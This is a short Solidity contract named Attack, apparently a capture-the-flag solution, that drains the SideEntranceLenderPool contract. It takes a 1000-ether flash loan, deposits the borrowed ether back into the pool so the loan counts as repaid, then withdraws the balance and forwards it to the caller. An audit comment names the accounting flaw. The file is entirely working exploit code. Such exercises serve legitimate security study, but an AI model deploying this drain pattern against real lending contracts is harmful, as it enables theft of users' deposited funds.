//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
contract Attack {
    SideEntranceLenderPool public immutable pool;
    uint256 public constant TO_DRAIN = 1000 ether;
    uint8 counter;

    constructor(SideEntranceLenderPool _pool){
        pool = _pool;
    }

    function execute () public payable {
        // if (counter == 0) {
        //     counter += 1;
        //     pool.flashLoan(0);
        // } else {
        //     return;
        // }
        pool.deposit{value: TO_DRAIN}(); //@audit-issue This is the error, the accounting of the smart contract. I'm allowed to deposit with the borrowings of the flash loans. 
    }


    function getDrainedFunds () public {
        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    } 

    function attack ()  public {
        pool.flashLoan(TO_DRAIN);
        pool.withdraw();
    }

    receive() external payable {}

}